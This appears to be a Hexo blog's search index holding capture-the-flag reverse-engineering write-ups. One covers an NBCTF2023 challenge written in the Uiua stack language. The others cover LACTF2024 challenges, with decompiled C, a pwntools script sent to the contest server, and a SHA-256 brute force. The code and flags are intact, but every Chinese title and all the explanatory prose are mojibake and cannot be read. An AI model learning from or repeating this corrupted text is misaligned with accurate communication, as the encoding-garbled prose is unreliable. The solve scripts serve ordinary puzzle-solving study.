<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>å¤ç¥è¯­(Uiua)ä¹‹ç ”ç©¶</title>
    <url>/2024/03/05/%E5%8F%A4%E7%A5%9E%E8%AF%AD%E4%B9%8B%E7%A0%94%E7%A9%B6/</url>
    <content><![CDATA[<p>åœ¨NBCTF2023é‡åˆ°äº†å¾ˆå¥‡æ€ªçš„ä¸€å¨ é¢˜ç›®ç»™äº†ä¸€ä¸ªå›¾ç‰‡æ–‡ä»¶å’Œä¸€ä¸ª<code>.ua</code>æ–‡ä»¶ é‚£æ—¶å€™ä¸€ç›´æ²¡ææ‡‚.uaæ˜¯ä»€ä¹ˆ æœ€è¿‘åœ¨DCç¾¤ç»„é‡åˆ°äº†å‡ºé¢˜äºº ä»–æç¤º: </p>
<p>[uiua.org]: uiua.org	â€œUiua (wee-wuh ğŸ”‰) is a general purpose, stack-based, array-oriented programming languageâ€</p>
<p> ä»æ­¤å¼€å¯äº† <del>å¤ç¥è¯­ä¹‹æ—…</del> ä¸€ç§æ ˆæœºè¯­è¨€çš„ç ”ç©¶(<del>å®é™…ä¸Šæ‰ç ”ç©¶äº†ä¸¤å¤©</del>) è§†è¯¥è¯­è¨€åç»­åœ¨CTFä¸­é‡åˆ°çš„é¢‘ç‡æˆ–è€…å‘ç°äº†ä»€ä¹ˆç‹¬ç‰¹çš„ç”¨é€”è€Œæ›´æ–°è¯¥ç ”ç©¶</p>
<span id="more"></span>

<h3 id="Uiua"><a href="#Uiua" class="headerlink" title="Uiua"></a>Uiua</h3><h4 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h4><p>å¦‚å®˜ç½‘æ‰€è¯´ è¿™æ˜¯ä¸€ç§åŸºäº<code>Rust</code>çš„æ ˆæœºè¯­è¨€ ä½†æ˜¯åŒæ—¶ä¹Ÿæ˜¯ä¸€ç§åŠŸèƒ½ååˆ†å¼ºå¤§çš„é¢å‘æ•°ç»„è¯­è¨€(å¯¹æ•°ç»„çš„å¤„ç†èƒ½åŠ›æå¼ºä¸”å®Œå¤‡) åŒæ—¶è¿˜å†…ç½®å¯¹éŸ³é¢‘å’Œè§†é¢‘çš„ç”Ÿæˆå’Œå¤„ç† ç»è¿‡è¿™ä¸¤å¤©çš„ç ”ç©¶æˆ‘å‘ç°å…¶å®ç”¨æ€§å…¶å®éå¸¸å¼º åªæ˜¯å› ä¸ºä½¿ç”¨äº†å„ç§å¥‡æ€ªçš„å­—ç¬¦è®©äººè§‰å¾—ä¸æ˜¯å¾ˆæ­£ç» ä½†æ˜¯å…¶å®æ‰€æœ‰çš„ç¬¦å·éƒ½æœ‰å¯¹åº”çš„è‹±æ–‡æŒ‡ä»¤</p>
<h4 id="åŸºæœ¬ç‰¹æ€§"><a href="#åŸºæœ¬ç‰¹æ€§" class="headerlink" title="åŸºæœ¬ç‰¹æ€§"></a>åŸºæœ¬ç‰¹æ€§</h4><p>ç¬¬ä¸€ä¸ªä¸å¾—ä¸æçš„ <del>æ„å¼</del> ç‰¹æ€§å°±æ˜¯å¯¹ä¸åˆ†è¡Œ(è¯¥è¯­è¨€å¯¹æ ¼å¼æ•æ„Ÿ)çš„ä¸€æ¡è¯­å¥è§£é‡Šå™¨çš„é˜…è¯»é¡ºåºæ˜¯ç”±å³åˆ°å·¦ å¯¹å¤šæ¡è¯­å¥çš„æ˜¯ç”±ä¸Šè‡³ä¸‹</p>
<p>ç”±äºå…¶åŸºäºæ ˆ å˜é‡åä¹‹ç±»çš„å®é™…ä¸Šä¸é‡è¦ ä½†æ˜¯ä¹Ÿæä¾›äº†å®šä¹‰å˜é‡åä¸ç›¸å…³å€¼çš„ç›¸å…³æ“ä½œ å®šä¹‰çš„å˜é‡ä¸ä¼šå‚¨å­˜äºæ ˆä¸­(<code>?</code> ç”¨äºæ‰“å°å½“å‰æ ˆçš„ä¿¡æ¯):</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024/03/05/20240305-212827.png" alt="image-20240305212820170"></p>
<p>æä¾›äº†ä¸€ç§ç±»ä¼¼Wasm åŒæ—¶åˆæ¯”Wasmä¾¿æ·çš„ç¼–ç¨‹ä½“éªŒ</p>
<p>åŒæ—¶ç”±äºæ‰€æœ‰çš„è¿ç®—éƒ½åŸºäºæ ˆ ä½œä¸ºæ“ä½œæŒ‡ä»¤å‚é‡çš„æ ˆä¸­æ•°æ®åœ¨å‚ä¸å®Œè¿ç®—åå¦‚æœæ²¡æœ‰ç‰¹æ®Šæ“ä½œéƒ½ä¼šç›´æ¥é”€æ¯(å¹¶ä¸<code>pop</code>åˆ°å“ªäº›å˜é‡ä¸­ å½“ç„¶ä¹Ÿå¯ä»¥æ·»åŠ <code>pop</code>æ“ä½œ) </p>
<p>ä¾‹å¦‚:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024/03/05/20240305-214009.png" alt="image-20240305214009805"></p>
<p>ä»è¿™é‡Œä¹Ÿå¯ä»¥çœ‹å‡ºè¿ç®—çš„é¡ºåºæ˜¯<code>op(value-second-top-to-stack) with value-top-to-stack</code> </p>
<p>å¦‚ä¸Šé¢æ‰€è¯´ è¿™æ˜¯ä¸€ä¸ªé¢å‘æ•°ç»„çš„è¯­è¨€ å‡ ä¹æ‰€æœ‰åŠŸèƒ½å’Œæ•°ç»„éƒ½å¯†åˆ‡ç›¸å…³ è€ŒUiuaæä¾›äº†ç±»ä¼¼<code>numpy</code>åº“ä¸­çš„çŸ©é˜µæ“ä½œç”¨ä»¥å¤„ç†æ•°ç»„å½¢æˆçš„çŸ©é˜µ</p>
<p>å¯¹äºä¸‰ç»´çŸ©é˜µè‹¥å…¶ç¬¬1, 2ç»´çš„é•¿åº¦å‡è¶…è¿‡20ä¸”ç¬¬3ç»´ä¸º3æˆ–4å°±å¯ä»¥ç”Ÿæˆå¯¹åº”çš„RGBé€šé“æˆ–RGB-Alphaé€šé“å›¾ç‰‡ <del>è€ŒéŸ³é¢‘ æˆ‘æ²¡æœ‰ç ”ç©¶</del></p>
<h4 id="åº”ç”¨å®ä¾‹"><a href="#åº”ç”¨å®ä¾‹" class="headerlink" title="åº”ç”¨å®ä¾‹"></a>åº”ç”¨å®ä¾‹</h4><h5 id="NBCTF2023-rev-wee-woo"><a href="#NBCTF2023-rev-wee-woo" class="headerlink" title="[NBCTF2023&#x2F;rev&#x2F;wee-woo]"></a>[NBCTF2023&#x2F;rev&#x2F;wee-woo]</h5><p>é¢˜ç›®ç»™å‡ºçš„å¤ç¥è¯­:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Flag â† &quot;nbctf&#123;redacted&#125;&quot;</span><br><span class="line">Flag â† utf Flag</span><br><span class="line">Ã·â¿:âŒˆÎ·;â¢(âŒŠÃ·â…â¿âŒˆÎ·Ï€:+â—¿â…â¿âŒˆÎ·Ï€,:)(â‰ -Ã—â…Î·Ï€Ï„):-Ã—â…Î·Ï€Ï„â‹…âˆ˜â¥(+,:)â‹…âˆ˜â¥(+,:)âŒŠÏ„..âŒŠÎ·-Ã—â…Î·Ï€Ï„;â¢(: â†¯:â‰:â†¯âŒŠÎ·:â†¯âŠŸ.âŒˆâˆš,:â§». â˜‡-Ã—â…Î·Ï€Ï„â†»Ã—â…Ï€,â—«+â…-âŒŠÎ·Ï„,â†»-â…Ï€,â—¿â¿:âŒˆÎ·;â¢(âŒŠÃ·â…â¿âŒˆÎ·Ï€:+â—¿â…â¿âŒˆÎ·Ï€,:)(â‰ -Ã—â…Î·Ï€Ï„):-Ã—â…Î·Ï€Ï„â‹…âˆ˜â¥(+,:)â‹…âˆ˜â¥(+,:)âŒŠÏ„..âŒŠÎ·-Ã—â…Î·Ï€Ï„-:â¿:âŒˆÎ·;â¢(âŒŠÃ·â…â¿âŒˆÎ·Ï€:+â—¿â…â¿âŒˆÎ·Ï€,:)(â‰ -Ã—â…Î·Ï€Ï„):-Ã—â…Î·Ï€Ï„â‹…âˆ˜â¥(+,:)â‹…âˆ˜â¥(+,:)âŒŠÏ„..âŒŠÎ·-Ã—â…Î·Ï€Ï„:-âŒŠÎ·)(&gt;-Ã—â…Î·Ï€Ï„)â…â‚™â‹…âˆ˜â¥(+,:)âŒˆÏ€.âŒŠÎ·Ã—Î·â§».Flag</span><br><span class="line">â†¯ 300_300_3</span><br><span class="line">â§» Flag</span><br><span class="line"># 49</span><br></pre></td></tr></table></figure>

<p>å…·ä½“å«ä¹‰å¦‚ä¸‹(æ ¹æ®å®˜ç½‘è‡ªå¸¦çš„ç¼–è¯‘å™¨ä»¥åŠç¬¦å·å«ä¹‰å¾—å‡º å…¶å®çœ‹ç€éå¸¸å¤æ‚çš„ä»£ç æœ‰å¾ˆå¤§ä¸€éƒ¨åˆ†æ˜¯æ··æ·† å³ç”¨ä»£æ•°è¿ç®—ç»“æœæ¥ä»£æ›¿ä¸€äº›æ•°å€¼):</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">â¢(</span><br><span class="line">  :-1</span><br><span class="line">  :-Ã—â…Î·Ï€Ï„â‹…âˆ˜â¥(+,:)â‹…âˆ˜â¥(+,:)âŒŠÏ„..âŒŠÎ·-Ã—â…Î·Ï€Ï„</span><br><span class="line">  â¢(âŒŠÃ·â…â¿âŒˆÎ·Ï€:+â—¿â…â¿âŒˆÎ·Ï€,:)(â‰ -Ã—â…Î·Ï€Ï„)</span><br><span class="line">  :-Ã—â…Î·Ï€Ï„â‹…âˆ˜â¥(+,:)â‹…âˆ˜â¥(+,:)âŒŠÏ„..âŒŠÎ·-Ã—â…Î·Ï€Ï„-:â¿:âŒˆÎ·â—Œ # 256 - Flag</span><br><span class="line">  â¢(âŒŠÃ·â…â¿âŒˆÎ·Ï€:+â—¿â…â¿âŒˆÎ·Ï€,:)(â‰ -Ã—â…Î·Ï€Ï„)</span><br><span class="line">  â†»-â…Ï€,â—¿â¿:âŒˆÎ·â—Œ # å³ç§»3 - nè¡Œ n = (2, 1, 0)</span><br><span class="line">  â—«+â…-âŒŠÎ·Ï„,    # æ„é€ çª—å£ åˆ—æ•°ä¸º7 - n</span><br><span class="line">  -Ã—â…Î·Ï€Ï„â†»Ã—â…Ï€, # ä¸Šç§» 3n è¡Œ</span><br><span class="line">  â˜‡           # é“ºå¹³ä¸º1ç»´</span><br><span class="line">  âŠŸ.âŒˆâˆš,:â§».    # é•¿åº¦å…¥æ ˆäº¤æ¢å’ŒçŸ©é˜µçš„ä½ç½® å‹å…¥shape = [., ceil(âˆšlen)]</span><br><span class="line">  :â†¯          # æ”¹å˜çŸ©é˜µå½¢çŠ¶ä¸ºshape å–å°½åæœªå¡«æ»¡ä»å¤´å†å–</span><br><span class="line">  :â†¯âŒŠÎ·</span><br><span class="line">  :â‰ # çŸ©é˜µè½¬ç½®</span><br><span class="line">  :â†¯ # å–åŸæ¥çš„çŸ©é˜µå¤§å°æ‘Šå¹³ä¸º1ç»´</span><br><span class="line">)(&gt;0)</span><br><span class="line">:-Ã—â…Î·Ï€Ï„â‹…âˆ˜â¥(+,:)â‹…âˆ˜â¥(+,:)âŒŠÏ„..âŒŠÎ·-Ã—â…Î·Ï€Ï„</span><br><span class="line">â¢(</span><br><span class="line">  âŒŠÃ·â…â¿âŒˆÎ·Ï€:+â—¿â…â¿âŒˆÎ·Ï€,:</span><br><span class="line">)(â‰ -Ã—â…Î·Ï€Ï„)</span><br><span class="line">Ã·â¿:âŒˆÎ·â—Œ</span><br><span class="line">â†¯ 300_300_3</span><br></pre></td></tr></table></figure>

<p>æ ¹æ®ä»¥ä¸Šçš„åˆ†æ é¢˜ç›®çš„å¤ç¥è¯­å¹¶æ²¡æœ‰å¯¹Flagè¿›è¡Œä»»ä½•ç‰¹æ®ŠåŠ å¯† åªæ˜¯å•çº¯çš„å°†256ä¸æ¯ä¸ªå€¼ç›¸å‡ç„¶åè¿›è¿‡ä¸€ç³»åˆ—çŸ©é˜µå˜åŒ–æ‰“ä¹±é¡ºåºå†æ„æˆRGBä¸‰é€šé“æ¥ç”Ÿæˆå›¾ç‰‡ åŒæ—¶æœ€åè¾“å‡ºäº†Flagçš„å®é™…é•¿åº¦49</p>
<p>é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥å…ˆå¤„ç†ä¸€æ®µé•¿49 ä¸”å¤„ç†å®Œåçš„å€¼ä¸º[0~48]çš„é¡ºåºåˆ—è¡¨æ¥å½“ä½œä¸‹æ ‡æ ‡è®°å¤„ç†åçš„å€¼æœ¬æ¥åº”è¯¥å­˜æ”¾åœ¨flagçš„ä»€ä¹ˆä½ç½®:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[256 255 254 253 252 251 250 249 248 247 246 245 244 243 242 241 240 239 238 237 236 235 234 233 232 231 230 229 228 227 226 225 224 223 222 221 220 219 218 217 216 215 214 213 212 211 210 209 208]</span><br><span class="line">3</span><br><span class="line">â¢(</span><br><span class="line">  :-1</span><br><span class="line">  :-Ã—â…Î·Ï€Ï„â‹…âˆ˜â¥(+,:)â‹…âˆ˜â¥(+,:)âŒŠÏ„..âŒŠÎ·-Ã—â…Î·Ï€Ï„</span><br><span class="line">  â¢(âŒŠÃ·â…â¿âŒˆÎ·Ï€:+â—¿â…â¿âŒˆÎ·Ï€,:)(â‰ -Ã—â…Î·Ï€Ï„)</span><br><span class="line">  :-Ã—â…Î·Ï€Ï„â‹…âˆ˜â¥(+,:)â‹…âˆ˜â¥(+,:)âŒŠÏ„..âŒŠÎ·-Ã—â…Î·Ï€Ï„-:â¿:âŒˆÎ·â—Œ # 256 - Flag</span><br><span class="line">  â¢(âŒŠÃ·â…â¿âŒˆÎ·Ï€:+â—¿â…â¿âŒˆÎ·Ï€,:)(â‰ -Ã—â…Î·Ï€Ï„)</span><br><span class="line">  â†»-â…Ï€,â—¿â¿:âŒˆÎ·â—Œ # å³ç§»3 - nè¡Œ n = (2, 1, 0)</span><br><span class="line">  â—«+â…-âŒŠÎ·Ï„,    # æ„é€ çª—å£ åˆ—æ•°ä¸º7 - n</span><br><span class="line">  -Ã—â…Î·Ï€Ï„â†»Ã—â…Ï€, # ä¸Šç§» 3n è¡Œ</span><br><span class="line">  â˜‡           # é“ºå¹³ä¸º1ç»´</span><br><span class="line">  âŠŸ.âŒˆâˆš,:â§».    # é•¿åº¦å…¥æ ˆäº¤æ¢å’ŒçŸ©é˜µçš„ä½ç½® å‹å…¥shape = [., ceil(âˆšlen)]</span><br><span class="line">  :â†¯          # æ”¹å˜çŸ©é˜µå½¢çŠ¶ä¸ºshape å–å°½åæœªå¡«æ»¡ä»å¤´å†å–</span><br><span class="line">  :â†¯âŒŠÎ·</span><br><span class="line">  :â‰ # çŸ©é˜µè½¬ç½®</span><br><span class="line">  :â†¯ # å–åŸæ¥çš„çŸ©é˜µå¤§å°æ‘Šå¹³ä¸º1ç»´</span><br><span class="line">)(&gt;0)</span><br><span class="line">:-Ã—â…Î·Ï€Ï„â‹…âˆ˜â¥(+,:)â‹…âˆ˜â¥(+,:)âŒŠÏ„..âŒŠÎ·-Ã—â…Î·Ï€Ï„</span><br><span class="line">â¢(</span><br><span class="line">  âŒŠÃ·â…â¿âŒˆÎ·Ï€:+â—¿â…â¿âŒˆÎ·Ï€,:</span><br><span class="line">)(â‰ -Ã—â…Î·Ï€Ï„)</span><br><span class="line">Ã·â¿:âŒˆÎ·â—Œ</span><br><span class="line">â†¯ 300_300_3</span><br><span class="line">â˜‡ 0 . # è½¬åŒ–å›åŸæ¥1ç»´æ–¹ä¾¿å¤„ç†</span><br></pre></td></tr></table></figure>

<p>ç»“æœå¤ªé•¿ä¸å±•ç¤º</p>
<p>ç„¶ååˆ©ç”¨é¢˜ç›®ç»™çš„å›¾ç‰‡è§£å¯†:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from PIL import Image</span><br><span class="line">import numpy as np</span><br><span class="line"></span><br><span class="line"># key = []</span><br><span class="line"># for i in range(49):</span><br><span class="line">#     key.append(256 - i)</span><br><span class="line"># print(str(key).replace(&quot;, &quot;, &quot; &quot; ))</span><br><span class="line"></span><br><span class="line">ind = [...]</span><br><span class="line">ind = [ind[3 * i:3 * i + 3] for i in range(len(ind) // 3)]</span><br><span class="line">flag = np.array(Image.open(&quot;flag.png&quot;))</span><br><span class="line">weiht, height = flag.shape[0], flag.shape[1]</span><br><span class="line">F = [257] * 49</span><br><span class="line">for i in range(weiht):</span><br><span class="line">    for j in range(height):</span><br><span class="line">        for k in range(3):</span><br><span class="line">            F[ind[300 * i + j][k]] = flag[i][j][k]</span><br><span class="line">            if 257 not in F:</span><br><span class="line">                F = [chr(255 - i) for i in F]</span><br><span class="line">                print(&quot;&quot;.join(F))</span><br><span class="line">                exit(0)</span><br><span class="line"># nbctf&#123;TBH_1_h4t3d_m4kin6_7h1s_ch4ll_6d1a32fe482b&#125;</span><br></pre></td></tr></table></figure>

<h3 id="åè®°"><a href="#åè®°" class="headerlink" title="åè®°"></a>åè®°</h3><p>è¿™å‡ å¤©çš„å¤ç¥è¯­ç ”ç©¶çœŸçš„è®©æˆ‘äº§ç”Ÿäº†ä¸€ç§â€è¿™æ˜¯ä¸€ç§éå¸¸å®‰å…¨ä¸”åŠŸèƒ½å¼ºå¤§çš„è¯­è¨€ å¦‚æœèƒ½åœ¨æŸäº›è¯­è¨€ä¸­å†…è”å®‰å…¨æ€§ä¸€å®šå¾ˆé«˜â€çš„æ„Ÿè§‰ è€Œä¸”å®˜æ–¹ç›®å‰ä¾ç„¶ä¿æŒé«˜é¢‘ç‡æ›´æ–° åªèƒ½è¯´å¸Œæœ›ä»¥åçœŸçš„èƒ½å®ç°å¤ç¥è¯­ä¿æŠ¤å§</p>
]]></content>
      <categories>
        <category>æ‚é¡¹</category>
      </categories>
      <tags>
        <tag>æ ˆæœº</tag>
        <tag>è™šæ‹Ÿæœº</tag>
      </tags>
  </entry>
  <entry>
    <title>LACTF2024é€†å‘æ–¹å‘éƒ¨åˆ†wp</title>
    <url>/2024/02/23/LACTF2024%E9%80%86%E5%90%91%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86wp/</url>
    <content><![CDATA[<p>å‚èµ›ID:1K0CT</p>
<span id="more"></span>

<h2 id="shattered-memories"><a href="#shattered-memories" class="headerlink" title="shattered-memories"></a><strong>shattered-memories</strong></h2><p>ç­¾åˆ°é¢˜ DIEæŸ¥å£³ æ— å£³64x IDA64æ‰“å¼€ç›´æ¥æ‹¼flag:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024/02/23/20240223-202615.png" alt="image-20240223202112685"></p>
<h2 id="aplet321-æ¥è½¨pwn"><a href="#aplet321-æ¥è½¨pwn" class="headerlink" title="aplet321 | æ¥è½¨pwn"></a><strong>aplet321</strong> | æ¥è½¨pwn</h2><p>DIEæŸ¥å£³ æ— å£³64x IDA64æ‰“å¼€:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *v3; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">size_t</span> v4; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// ebp</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// r12d</span></span><br><span class="line">  <span class="type">char</span> *v7; <span class="comment">// r15</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">568</span>]; <span class="comment">// [rsp+10h] [rbp-238h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v3 = s;</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;hi, i&#x27;m aplet321. how can i help?&quot;</span>);</span><br><span class="line">  fgets(s, <span class="number">512</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  v4 = <span class="built_in">strlen</span>(s);</span><br><span class="line">  <span class="keyword">if</span> ( v4 &lt;= <span class="number">5</span> )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_10;</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  v7 = &amp;s[(v4 - <span class="number">6</span>) + <span class="number">1</span>];</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    v6 += <span class="built_in">strncmp</span>(v3, <span class="string">&quot;pretty&quot;</span>, <span class="number">6uLL</span>) == <span class="number">0</span>;     <span class="comment">// v6 = 15</span></span><br><span class="line">                                                <span class="comment">// v5 = 39</span></span><br><span class="line">    v5 += <span class="built_in">strncmp</span>(v3++, <span class="string">&quot;please&quot;</span>, <span class="number">6uLL</span>) == <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v3 != v7 );</span><br><span class="line">  <span class="keyword">if</span> ( v5 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">strstr</span>(s, <span class="string">&quot;flag&quot;</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v6 + v5 == <span class="number">54</span> &amp;&amp; v6 - v5 == <span class="number">-24</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;ok here&#x27;s your flag&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;cat flag.txt&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;sorry, i&#x27;m not allowed to do that&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;sorry, i didn&#x27;t understand what you mean&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">LABEL_10:</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;so rude&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>é€»è¾‘æ˜¯æ£€æµ‹æ¥æ”¶åˆ°çš„æ•°æ®ä¸­åŒ…å«è¿ç»­çš„<code>pretty</code>æˆ–<code>please</code>çš„ä¸ªæ•°å¹¶è¦æ±‚å«æœ‰<code>flag</code> ç®€å•è§£è§£æ–¹ç¨‹ç®—å‡ºåˆ†åˆ«éœ€è¦å‡ºç°å¤šå°‘æ¬¡ ç„¶åå†™å‡ºexpå‘é€æ•°æ®:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">v6 =  <span class="string">b&quot;pretty&quot;</span> * <span class="number">15</span></span><br><span class="line">v5 =  <span class="string">b&quot;please&quot;</span> * <span class="number">39</span></span><br><span class="line">fin = <span class="string">b&quot;flag&quot;</span></span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;chall.lac.tf&quot;</span>, <span class="number">31321</span>)</span><br><span class="line"></span><br><span class="line">r.sendline(v6 + v5 + fin)</span><br><span class="line">r.interactive()</span><br><span class="line"><span class="comment"># lactf&#123;next_year_i&#x27;ll_make_aplet456_hqp3c1a7bip5bmnc&#125;</span></span><br></pre></td></tr></table></figure>

<h2 id="the-secret-of-java-island-javaé€†å‘-çˆ†ç ´"><a href="#the-secret-of-java-island-javaé€†å‘-çˆ†ç ´" class="headerlink" title="the-secret-of-java-island | javaé€†å‘ | çˆ†ç ´"></a><strong>the-secret-of-java-island</strong> | javaé€†å‘ | çˆ†ç ´</h2><p>ä¸€ä¸ªæŒ‰é’®ç‚¹å‡»å°æ¸¸æˆ ç›®æ ‡æ˜¯è¿›å…¥ä»¥ä¸‹çŠ¶æ€:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024/02/23/20240223-204927.png" alt="image-20240223204927460"></p>
<p>ä½†æ˜¯ç›´æ¥ncåˆ°è¯¥ç«¯å£æ— æ³•è·å¾—flag è¿˜æ˜¯è¦ç©æ¸¸æˆ æ ¸å¿ƒé€»è¾‘:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (paramInt == <span class="number">0</span>) &#123;</span><br><span class="line">  exploit += <span class="string">&quot;d&quot;</span>;</span><br><span class="line">  story.setText(<span class="string">&quot;You clobbered the DOM. That was exploit #&quot;</span> + exploit.length() + <span class="string">&quot;.&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  exploit += <span class="string">&quot;p&quot;</span>;</span><br><span class="line">  story.setText(<span class="string">&quot;You polluted the prototype. That was exploit #&quot;</span> + exploit.length() + <span class="string">&quot;.&quot;</span>);</span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">if</span> (exploit.length() == <span class="number">8</span>)</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="type">MessageDigest</span> <span class="variable">messageDigest</span> <span class="operator">=</span> MessageDigest.getInstance(<span class="string">&quot;SHA-256&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!Arrays.equals(messageDigest.digest(exploit.getBytes(<span class="string">&quot;UTF-8&quot;</span>)), <span class="keyword">new</span> <span class="title class_">byte</span>[] &#123; </span><br><span class="line">          <span class="number">69</span>, <span class="number">70</span>, -<span class="number">81</span>, -<span class="number">117</span>, -<span class="number">10</span>, <span class="number">109</span>, <span class="number">15</span>, <span class="number">29</span>, <span class="number">19</span>, <span class="number">113</span>, </span><br><span class="line">          <span class="number">61</span>, -<span class="number">123</span>, -<span class="number">39</span>, <span class="number">82</span>, -<span class="number">11</span>, -<span class="number">34</span>, <span class="number">104</span>, -<span class="number">98</span>, -<span class="number">111</span>, <span class="number">9</span>, </span><br><span class="line">          <span class="number">43</span>, <span class="number">35</span>, -<span class="number">19</span>, <span class="number">22</span>, <span class="number">52</span>, -<span class="number">55</span>, -<span class="number">124</span>, -<span class="number">45</span>, -<span class="number">72</span>, -<span class="number">23</span>, </span><br><span class="line">          <span class="number">96</span>, -<span class="number">77</span> &#125;)) &#123;</span><br><span class="line">      state = <span class="number">7</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      state = <span class="number">6</span>;</span><br><span class="line">    &#125; </span><br><span class="line">    updateGame();</span><br></pre></td></tr></table></figure>

<p>æ ¹æ®æŒ‰é’®ç‚¹å‡»æƒ…å†µå‘æ ¡éªŒå­—ç¬¦ä¸²æ·»åŠ <code>d</code>æˆ–è€…<code>p</code>ç„¶åæ±‚sha256å“ˆå¸Œå€¼è¿›è¡Œæ ¡éªŒ ç”±äºé•¿åº¦åªæœ‰8å¯èƒ½æ€§å¾ˆå°‘æ‰€ä»¥ç›´æ¥çˆ†ç ´:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">enc = <span class="string">&quot;4546af8bf66d0f1d13713d85d952f5de689e91092b23ed1634c984d3b8e960b3&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sha256_encrypt</span>(<span class="params">plaintext</span>):</span><br><span class="line">    plaintext_bytes = plaintext.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    sha256_hash = hashlib.sha256(plaintext_bytes)</span><br><span class="line">    <span class="keyword">return</span> sha256_hash.hexdigest().lower()</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x100</span>):</span><br><span class="line">        plaintext = <span class="string">&quot;&#123;:08b&#125;&quot;</span>.<span class="built_in">format</span>(i).replace(<span class="string">&quot;0&quot;</span>, <span class="string">&quot;p&quot;</span>).replace(<span class="string">&quot;1&quot;</span>, <span class="string">&quot;d&quot;</span>)</span><br><span class="line">        encrypted_hash = sha256_encrypt(plaintext)</span><br><span class="line">        <span class="keyword">if</span> encrypted_hash == enc:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;find:&quot;</span>, plaintext)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="comment"># find: dpddpdpp</span></span><br></pre></td></tr></table></figure>

<p>ç„¶ååœ¨æ¸¸æˆä¸­è¿›è¡Œå¯¹åº”æ“ä½œè·å¾—flag</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024/02/23/20240223-205334.png" alt="image-20240223205333972"></p>
